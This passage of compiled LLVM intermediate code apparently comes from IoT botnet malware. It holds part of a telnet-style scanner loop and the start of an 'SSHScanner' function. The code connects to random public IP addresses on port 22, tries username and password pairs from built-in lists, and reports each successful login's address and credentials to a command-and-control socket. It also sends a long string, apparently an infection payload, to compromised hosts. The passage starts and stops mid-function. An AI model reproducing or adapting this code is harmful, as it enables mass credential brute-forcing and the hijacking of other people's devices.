  %634 = load i32, i32* %633, align 16
  %635 = call i64 @send(i32 %634, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.76, i64 0, i64 0), i64 49, i32 16384) #3
  %636 = icmp slt i64 %635, 0
  br i1 %636, label %637, label %641

; <label>:637:                                    ; preds = %632
  %638 = load i32, i32* %633, align 16
  %639 = call i32 @sclose(i32 %638)
  store i8 0, i8* %41, align 8
  %640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 1, i8* %640, align 1
  br label %744

; <label>:641:                                    ; preds = %632
  store i8 12, i8* %41, align 8
  br label %642

; <label>:642:                                    ; preds = %641, %.lr.ph
  %643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 6
  %644 = load i32, i32* %643, align 4
  %645 = icmp eq i32 %644, 0
  br i1 %645, label %646, label %649

; <label>:646:                                    ; preds = %642
  %647 = call i64 @time(i64* null) #3
  %648 = trunc i64 %647 to i32
  store i32 %648, i32* %643, align 4
  br label %649

; <label>:649:                                    ; preds = %646, %642
  %650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %40, i64 0, i32 0
  %651 = load i32, i32* %650, align 16
  %652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 8
  %653 = load i8*, i8** %652, align 8
  %654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 7
  %655 = load i16, i16* %654, align 16
  %656 = zext i16 %655 to i32
  %657 = call i32 @readUntil(i32 %651, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.77, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %653, i32 1024, i32 %656)
  %658 = icmp eq i32 %657, 0
  br i1 %658, label %677, label %659

; <label>:659:                                    ; preds = %649
  store i32 0, i32* %643, align 4
  store i16 0, i16* %654, align 16
  %660 = load i32, i32* %650, align 16
  %661 = call i64 @send(i32 %660, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), i64 394, i32 16384) #3
  %662 = load i32, i32* @mainCommSock, align 4
  %663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 1
  %664 = load i32, i32* %663, align 4
  %665 = call i8* @inet_ntoa(i32 %664) #3
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 4
  %667 = load i8, i8* %666, align 2
  %668 = zext i8 %667 to i64
  %669 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %668
  %670 = load i8*, i8** %669, align 8
  %671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 5
  %672 = load i8, i8* %671, align 1
  %673 = zext i8 %672 to i64
  %674 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %673
  %675 = load i8*, i8** %674, align 8
  %676 = call i32 (i32, i8*, ...) @sockprintf(i32 %662, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0), i8* %665, i8* %670, i8* %675)
  br label %744

; <label>:677:                                    ; preds = %649
  %678 = load i32, i32* %650, align 16
  %679 = load i8*, i8** %652, align 8
  %680 = load i16, i16* %654, align 16
  %681 = zext i16 %680 to i32
  %682 = call i32 @readUntil(i32 %678, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %679, i32 1024, i32 %681)
  %683 = icmp eq i32 %682, 0
  br i1 %683, label %702, label %684

; <label>:684:                                    ; preds = %677
  store i32 0, i32* %643, align 4
  store i16 0, i16* %654, align 16
  %685 = load i32, i32* %650, align 16
  %686 = call i64 @send(i32 %685, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), i64 394, i32 16384) #3
  %687 = load i32, i32* @mainCommSock, align 4
  %688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 1
  %689 = load i32, i32* %688, align 4
  %690 = call i8* @inet_ntoa(i32 %689) #3
  %691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 4
  %692 = load i8, i8* %691, align 2
  %693 = zext i8 %692 to i64
  %694 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %693
  %695 = load i8*, i8** %694, align 8
  %696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 5
  %697 = load i8, i8* %696, align 1
  %698 = zext i8 %697 to i64
  %699 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %698
  %700 = load i8*, i8** %699, align 8
  %701 = call i32 (i32, i8*, ...) @sockprintf(i32 %687, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0), i8* %690, i8* %695, i8* %700)
  br label %744

; <label>:702:                                    ; preds = %677
  %703 = load i32, i32* %650, align 16
  %704 = load i8*, i8** %652, align 8
  %705 = load i16, i16* %654, align 16
  %706 = zext i16 %705 to i32
  %707 = call i32 @readUntil(i32 %703, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %704, i32 1024, i32 %706)
  %708 = icmp eq i32 %707, 0
  br i1 %708, label %731, label %709

; <label>:709:                                    ; preds = %702
  store i32 0, i32* %643, align 4
  store i16 0, i16* %654, align 16
  %710 = load i32, i32* %650, align 16
  %711 = call i64 @send(i32 %710, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), i64 394, i32 16384) #3
  %712 = load i32, i32* @mainCommSock, align 4
  %713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 1
  %714 = load i32, i32* %713, align 4
  %715 = call i8* @inet_ntoa(i32 %714) #3
  %716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 4
  %717 = load i8, i8* %716, align 2
  %718 = zext i8 %717 to i64
  %719 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %718
  %720 = load i8*, i8** %719, align 8
  %721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 5
  %722 = load i8, i8* %721, align 1
  %723 = zext i8 %722 to i64
  %724 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %723
  %725 = load i8*, i8** %724, align 8
  %726 = call i32 (i32, i8*, ...) @sockprintf(i32 %712, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0), i8* %715, i8* %720, i8* %725)
  %727 = load i8*, i8** %652, align 8
  call void @llvm.memset.p0i8.i64(i8* %727, i8 0, i64 1024, i32 1, i1 false)
  %728 = load i32, i32* %650, align 16
  %729 = call i32 @sclose(i32 %728)
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 1, i8* %730, align 1
  store i8 0, i8* %41, align 8
  br label %744

; <label>:731:                                    ; preds = %702
  %732 = load i8*, i8** %652, align 8
  %733 = call i64 @strlen(i8* %732) #15
  %734 = trunc i64 %733 to i16
  store i16 %734, i16* %654, align 16
  %735 = load i32, i32* %643, align 4
  %736 = add i32 %735, 10
  %737 = zext i32 %736 to i64
  %738 = call i64 @time(i64* null) #3
  %739 = icmp slt i64 %737, %738
  br i1 %739, label %740, label %744

; <label>:740:                                    ; preds = %731
  %741 = load i32, i32* %650, align 16
  %742 = call i32 @sclose(i32 %741)
  store i8 0, i8* %41, align 8
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %39, i32 3
  store i8 1, i8* %743, align 1
  br label %744

; <label>:744:                                    ; preds = %.lr.ph, %261, %392, %592, %602, %612, %628, %93, %90, %142, %136, %235, %226, %366, %358, %579, %570, %740, %731, %69, %709, %684, %659, %637, %608, %598, %588, %568, %564, %551, %547, %534, %530, %517, %513, %500, %496, %483, %479, %466, %462, %449, %445, %438, %425, %421, %414, %388, %382, %354, %347, %340, %333, %326, %319, %312, %305, %298, %290, %279, %257, %251, %225, %211, %197, %183, %169, %125, %68
  %745 = add nsw i32 %.1339, 1
  %746 = icmp slt i32 %745, %11
  %brmerge = or i1 %746, %31
  %.mux = select i1 %746, i32 %745, i32 0
  br i1 %brmerge, label %.lr.ph, label %infloop.preheader

infloop.preheader:                                ; preds = %744
  br label %infloop

infloop:                                          ; preds = %infloop.preheader, %infloop
  br label %infloop
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

declare i32 @system(i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #5

; Function Attrs: noinline noreturn nounwind uwtable
define void @SSHScanner() local_unnamed_addr #13 {
  %1 = alloca %struct.__sigset_t, align 8
  %2 = alloca %struct.timeval, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.timeval, align 8
  %7 = tail call i32 @getdtablesize() #3
  %8 = sdiv i32 %7, 4
  %9 = mul nsw i32 %8, 3
  %10 = icmp slt i32 %9, 512
  %11 = select i1 %10, i32 %9, i32 512
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %12, align 4
  %13 = tail call zeroext i16 @htons(i16 zeroext 22) #18
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %13, i16* %14, align 2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %16 = bitcast i8* %15 to i64*
  store i64 0, i64* %16, align 4
  %17 = zext i32 %11 to i64
  %18 = alloca %struct.telstate_t, i64 %17, align 16
  %19 = bitcast %struct.telstate_t* %18 to i8*
  %20 = sext i32 %11 to i64
  %21 = mul nsw i64 %20, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %19, i8 0, i64 %21, i32 16, i1 false)
  %22 = icmp sgt i32 %7, 3
  br i1 %22, label %.lr.ph335.preheader, label %._crit_edge

.lr.ph335.preheader:                              ; preds = %0
  %23 = sext i32 %11 to i64
  br label %.lr.ph335

.lr.ph335:                                        ; preds = %.lr.ph335.preheader, %.lr.ph335
  %indvars.iv = phi i64 [ 0, %.lr.ph335.preheader ], [ %indvars.iv.next, %.lr.ph335 ]
  %24 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv, i32 3
  store i8 1, i8* %24, align 1
  %25 = tail call noalias i8* @malloc(i64 1024) #3
  %26 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %indvars.iv, i32 8
  store i8* %25, i8** %26, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %25, i8 0, i64 1024, i32 1, i1 false)
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %27 = icmp slt i64 %indvars.iv.next, %23
  br i1 %27, label %.lr.ph335, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph335
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %0
  %28 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  store i64 5, i64* %28, align 8
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  store i64 0, i64* %29, align 8
  %30 = icmp sgt i32 %7, 3
  %31 = bitcast %struct.timeval* %6 to i8*
  %32 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 0
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %2, i64 0, i32 1
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit, %._crit_edge
  br i1 %30, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %35 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %36 = getelementptr inbounds %struct.timeval, %struct.timeval* %2, i64 0, i32 0
  %37 = bitcast i32* %4 to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %729
  %.1333 = phi i32 [ %.mux, %729 ], [ 0, %.lr.ph.preheader ]
  %38 = sext i32 %.1333 to i64
  %39 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38
  %40 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 2
  %41 = load i8, i8* %40, align 8
  switch i8 %41, label %729 [
    i8 0, label %42
    i8 1, label %94
    i8 2, label %145
    i8 3, label %238
    i8 4, label %261
    i8 5, label %369
    i8 6, label %392
    i8 7, label %582
    i8 8, label %592
    i8 9, label %602
    i8 10, label %627
  ]

; <label>:42:                                     ; preds = %.lr.ph
  %43 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 8
  %44 = load i8*, i8** %43, align 8
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 1024, i32 1, i1 false)
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  %46 = load i8, i8* %45, align 1
  %47 = icmp eq i8 %46, 0
  br i1 %47, label %54, label %48

; <label>:48:                                     ; preds = %42
  %49 = bitcast i8** %43 to i64*
  %50 = load i64, i64* %49, align 8
  %51 = bitcast %struct.telstate_t* %39 to i8*
  call void @llvm.memset.p0i8.i64(i8* %51, i8 0, i64 32, i32 16, i1 false)
  store i64 %50, i64* %49, align 8
  %52 = call i32 @getRandomPublicIP()
  %53 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 1
  store i32 %52, i32* %53, align 4
  br label %68

; <label>:54:                                     ; preds = %42
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 5
  %56 = load i8, i8* %55, align 1
  %57 = add i8 %56, 1
  store i8 %57, i8* %55, align 1
  %58 = icmp eq i8 %57, 13
  br i1 %58, label %59, label %63

; <label>:59:                                     ; preds = %54
  store i8 0, i8* %55, align 1
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 4
  %61 = load i8, i8* %60, align 2
  %62 = add i8 %61, 1
  store i8 %62, i8* %60, align 2
  br label %63

; <label>:63:                                     ; preds = %59, %54
  %64 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 4
  %65 = load i8, i8* %64, align 2
  %66 = icmp eq i8 %65, 4
  br i1 %66, label %67, label %68

; <label>:67:                                     ; preds = %63
  store i8 1, i8* %45, align 1
  br label %729

; <label>:68:                                     ; preds = %63, %48
  store i16 2, i16* %12, align 4
  store i16 %13, i16* %14, align 2
  store i64 0, i64* %16, align 4
  %69 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 1
  %70 = load i32, i32* %69, align 4
  store i32 %70, i32* %34, align 4
  %71 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %72 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  store i32 %71, i32* %72, align 16
  %73 = call i32 @setsockopt(i32 %71, i32 1, i32 20, i8* nonnull %31, i32 16) #3
  %74 = load i32, i32* %72, align 16
  %75 = call i32 @setsockopt(i32 %74, i32 1, i32 21, i8* nonnull %31, i32 16) #3
  %76 = load i32, i32* %72, align 16
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %729, label %78

; <label>:78:                                     ; preds = %68
  %79 = call i32 (i32, i32, ...) @fcntl(i32 %76, i32 3, i8* null) #3
  %80 = or i32 %79, 2048
  %81 = call i32 (i32, i32, ...) @fcntl(i32 %76, i32 4, i32 %80) #3
  %82 = load i32, i32* %72, align 16
  %83 = call i32 @connect(i32 %82, %struct.sockaddr* nonnull %35, i32 16) #3
  %84 = icmp eq i32 %83, -1
  br i1 %84, label %85, label %92

; <label>:85:                                     ; preds = %78
  %86 = tail call i32* @__errno_location() #18
  %87 = load i32, i32* %86, align 4
  %88 = icmp eq i32 %87, 115
  br i1 %88, label %92, label %89

; <label>:89:                                     ; preds = %85
  %90 = load i32, i32* %72, align 16
  %91 = call i32 @sclose(i32 %90)
  store i8 1, i8* %45, align 1
  br label %729

; <label>:92:                                     ; preds = %85, %78
  store i8 1, i8* %40, align 8
  %93 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 6
  store i32 0, i32* %93, align 4
  br label %729

; <label>:94:                                     ; preds = %.lr.ph
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 6
  %96 = load i32, i32* %95, align 4
  %97 = icmp eq i32 %96, 0
  br i1 %97, label %98, label %101

; <label>:98:                                     ; preds = %94
  %99 = call i64 @time(i64* null) #3
  %100 = trunc i64 %99 to i32
  store i32 %100, i32* %95, align 4
  br label %101

; <label>:101:                                    ; preds = %94, %98
  %102 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %32) #3, !srcloc !7
  %103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %104 = load i32, i32* %103, align 16
  %105 = srem i32 %104, 64
  %106 = zext i32 %105 to i64
  %107 = shl i64 1, %106
  %108 = sdiv i32 %104, 64
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %1, i64 0, i32 0, i64 %109
  %111 = load i64, i64* %110, align 8
  %112 = or i64 %107, %111
  store i64 %112, i64* %110, align 8
  store i64 0, i64* %36, align 8
  store i64 10000, i64* %33, align 8
  %113 = load i32, i32* %103, align 16
  %114 = add nsw i32 %113, 1
  %115 = call i32 @select(i32 %114, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %1, %struct.__sigset_t* null, %struct.timeval* nonnull %2) #3
  switch i32 %115, label %135 [
    i32 1, label %116
    i32 -1, label %131
  ]

; <label>:116:                                    ; preds = %101
  store i32 4, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %117 = load i32, i32* %103, align 16
  %118 = call i32 @getsockopt(i32 %117, i32 1, i32 4, i8* nonnull %37, i32* nonnull %3) #3
  %119 = load i32, i32* %4, align 4
  %120 = icmp eq i32 %119, 0
  %121 = load i32, i32* %103, align 16
  br i1 %120, label %124, label %122

; <label>:122:                                    ; preds = %116
  %123 = call i32 @sclose(i32 %121)
  br label %.sink.split

; <label>:124:                                    ; preds = %116
  %125 = call i32 (i32, i32, ...) @fcntl(i32 %121, i32 3, i8* null) #3
  %126 = and i32 %125, -2049
  %127 = call i32 (i32, i32, ...) @fcntl(i32 %121, i32 4, i32 %126) #3
  store i32 0, i32* %95, align 4
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 7
  store i16 0, i16* %128, align 16
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 8
  %130 = load i8*, i8** %129, align 8
  call void @llvm.memset.p0i8.i64(i8* %130, i8 0, i64 1024, i32 1, i1 false)
  store i8 2, i8* %40, align 8
  br label %729

; <label>:131:                                    ; preds = %101
  %132 = load i32, i32* %103, align 16
  %133 = call i32 @sclose(i32 %132)
  br label %.sink.split

.sink.split:                                      ; preds = %122, %131
  store i8 0, i8* %40, align 8
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %134, align 1
  br label %135

; <label>:135:                                    ; preds = %101, %.sink.split
  %136 = load i32, i32* %95, align 4
  %137 = add i32 %136, 10
  %138 = zext i32 %137 to i64
  %139 = call i64 @time(i64* null) #3
  %140 = icmp slt i64 %138, %139
  br i1 %140, label %141, label %729

; <label>:141:                                    ; preds = %135
  %142 = load i32, i32* %103, align 16
  %143 = call i32 @sclose(i32 %142)
  store i8 0, i8* %40, align 8
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %144, align 1
  br label %729

; <label>:145:                                    ; preds = %.lr.ph
  %146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 6
  %147 = load i32, i32* %146, align 4
  %148 = icmp eq i32 %147, 0
  br i1 %148, label %149, label %152

; <label>:149:                                    ; preds = %145
  %150 = call i64 @time(i64* null) #3
  %151 = trunc i64 %150 to i32
  store i32 %151, i32* %146, align 4
  br label %152

; <label>:152:                                    ; preds = %149, %145
  %153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %154 = load i32, i32* %153, align 16
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 8
  %156 = load i8*, i8** %155, align 8
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 7
  %158 = load i16, i16* %157, align 16
  %159 = zext i16 %158 to i32
  %160 = call i32 @readUntil(i32 %154, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %156, i32 1024, i32 %159)
  %161 = icmp eq i32 %160, 0
  br i1 %161, label %169, label %162

; <label>:162:                                    ; preds = %152
  store i32 0, i32* %146, align 4
  store i16 0, i16* %157, align 16
  %163 = load i8*, i8** %155, align 8
  %164 = call i8* @strstr(i8* %163, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #15
  %165 = icmp eq i8* %164, null
  br i1 %165, label %167, label %166

; <label>:166:                                    ; preds = %162
  store i8 5, i8* %40, align 8
  br label %168

; <label>:167:                                    ; preds = %162
  call void @llvm.memset.p0i8.i64(i8* %163, i8 0, i64 1024, i32 1, i1 false)
  br label %168

; <label>:168:                                    ; preds = %167, %166
  store i8 3, i8* %40, align 8
  br label %729

; <label>:169:                                    ; preds = %152
  %170 = load i32, i32* %153, align 16
  %171 = load i8*, i8** %155, align 8
  %172 = load i16, i16* %157, align 16
  %173 = zext i16 %172 to i32
  %174 = call i32 @readUntil(i32 %170, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %171, i32 1024, i32 %173)
  %175 = icmp eq i32 %174, 0
  br i1 %175, label %183, label %176

; <label>:176:                                    ; preds = %169
  store i32 0, i32* %146, align 4
  store i16 0, i16* %157, align 16
  %177 = load i8*, i8** %155, align 8
  %178 = call i8* @strstr(i8* %177, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #15
  %179 = icmp eq i8* %178, null
  br i1 %179, label %181, label %180

; <label>:180:                                    ; preds = %176
  store i8 5, i8* %40, align 8
  br label %182

; <label>:181:                                    ; preds = %176
  call void @llvm.memset.p0i8.i64(i8* %177, i8 0, i64 1024, i32 1, i1 false)
  br label %182

; <label>:182:                                    ; preds = %181, %180
  store i8 3, i8* %40, align 8
  br label %729

; <label>:183:                                    ; preds = %169
  %184 = load i32, i32* %153, align 16
  %185 = load i8*, i8** %155, align 8
  %186 = load i16, i16* %157, align 16
  %187 = zext i16 %186 to i32
  %188 = call i32 @readUntil(i32 %184, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %185, i32 1024, i32 %187)
  %189 = icmp eq i32 %188, 0
  br i1 %189, label %197, label %190

; <label>:190:                                    ; preds = %183
  store i32 0, i32* %146, align 4
  store i16 0, i16* %157, align 16
  %191 = load i8*, i8** %155, align 8
  %192 = call i8* @strstr(i8* %191, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #15
  %193 = icmp eq i8* %192, null
  br i1 %193, label %195, label %194

; <label>:194:                                    ; preds = %190
  store i8 5, i8* %40, align 8
  br label %196

; <label>:195:                                    ; preds = %190
  call void @llvm.memset.p0i8.i64(i8* %191, i8 0, i64 1024, i32 1, i1 false)
  br label %196

; <label>:196:                                    ; preds = %195, %194
  store i8 3, i8* %40, align 8
  br label %729

; <label>:197:                                    ; preds = %183
  %198 = load i32, i32* %153, align 16
  %199 = load i8*, i8** %155, align 8
  %200 = load i16, i16* %157, align 16
  %201 = zext i16 %200 to i32
  %202 = call i32 @readUntil(i32 %198, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %199, i32 1024, i32 %201)
  %203 = icmp eq i32 %202, 0
  br i1 %203, label %211, label %204

; <label>:204:                                    ; preds = %197
  store i32 0, i32* %146, align 4
  store i16 0, i16* %157, align 16
  %205 = load i8*, i8** %155, align 8
  %206 = call i8* @strstr(i8* %205, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #15
  %207 = icmp eq i8* %206, null
  br i1 %207, label %209, label %208

; <label>:208:                                    ; preds = %204
  store i8 5, i8* %40, align 8
  br label %210

; <label>:209:                                    ; preds = %204
  call void @llvm.memset.p0i8.i64(i8* %205, i8 0, i64 1024, i32 1, i1 false)
  br label %210

; <label>:210:                                    ; preds = %209, %208
  store i8 3, i8* %40, align 8
  br label %729

; <label>:211:                                    ; preds = %197
  %212 = load i32, i32* %153, align 16
  %213 = load i8*, i8** %155, align 8
  %214 = load i16, i16* %157, align 16
  %215 = zext i16 %214 to i32
  %216 = call i32 @readUntil(i32 %212, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %213, i32 1024, i32 %215)
  %217 = icmp eq i32 %216, 0
  br i1 %217, label %225, label %218

; <label>:218:                                    ; preds = %211
  store i32 0, i32* %146, align 4
  store i16 0, i16* %157, align 16
  %219 = load i8*, i8** %155, align 8
  %220 = call i8* @strstr(i8* %219, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i64 0, i64 0)) #15
  %221 = icmp eq i8* %220, null
  br i1 %221, label %223, label %222

; <label>:222:                                    ; preds = %218
  store i8 5, i8* %40, align 8
  br label %224

; <label>:223:                                    ; preds = %218
  call void @llvm.memset.p0i8.i64(i8* %219, i8 0, i64 1024, i32 1, i1 false)
  br label %224

; <label>:224:                                    ; preds = %223, %222
  store i8 3, i8* %40, align 8
  br label %729

; <label>:225:                                    ; preds = %211
  %226 = load i8*, i8** %155, align 8
  %227 = call i64 @strlen(i8* %226) #15
  %228 = trunc i64 %227 to i16
  store i16 %228, i16* %157, align 16
  %229 = load i32, i32* %146, align 4
  %230 = add i32 %229, 10
  %231 = zext i32 %230 to i64
  %232 = call i64 @time(i64* null) #3
  %233 = icmp slt i64 %231, %232
  br i1 %233, label %234, label %729

; <label>:234:                                    ; preds = %225
  %235 = load i32, i32* %153, align 16
  %236 = call i32 @sclose(i32 %235)
  store i8 0, i8* %40, align 8
  %237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %237, align 1
  br label %729

; <label>:238:                                    ; preds = %.lr.ph
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %240 = load i32, i32* %239, align 16
  %241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 4
  %242 = load i8, i8* %241, align 2
  %243 = zext i8 %242 to i64
  %244 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %243
  %245 = load i8*, i8** %244, align 8
  %246 = call i64 @strlen(i8* %245) #15
  %247 = call i64 @send(i32 %240, i8* %245, i64 %246, i32 16384) #3
  %248 = icmp slt i64 %247, 0
  %249 = load i32, i32* %239, align 16
  br i1 %248, label %250, label %253

; <label>:250:                                    ; preds = %238
  %251 = call i32 @sclose(i32 %249)
  store i8 0, i8* %40, align 8
  %252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %252, align 1
  br label %729

; <label>:253:                                    ; preds = %238
  %254 = call i64 @send(i32 %249, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i64 0, i64 0), i64 2, i32 16384) #3
  %255 = icmp slt i64 %254, 0
  br i1 %255, label %256, label %260

; <label>:256:                                    ; preds = %253
  %257 = load i32, i32* %239, align 16
  %258 = call i32 @sclose(i32 %257)
  store i8 0, i8* %40, align 8
  %259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %259, align 1
  br label %729

; <label>:260:                                    ; preds = %253
  store i8 4, i8* %40, align 8
  br label %729

; <label>:261:                                    ; preds = %.lr.ph
  %262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 6
  %263 = load i32, i32* %262, align 4
  %264 = icmp eq i32 %263, 0
  br i1 %264, label %265, label %268

; <label>:265:                                    ; preds = %261
  %266 = call i64 @time(i64* null) #3
  %267 = trunc i64 %266 to i32
  store i32 %267, i32* %262, align 4
  br label %268

; <label>:268:                                    ; preds = %265, %261
  %269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 0, i32 0
  %270 = load i32, i32* %269, align 16
  %271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 8
  %272 = load i8*, i8** %271, align 8
  %273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 7
  %274 = load i16, i16* %273, align 16
  %275 = zext i16 %274 to i32
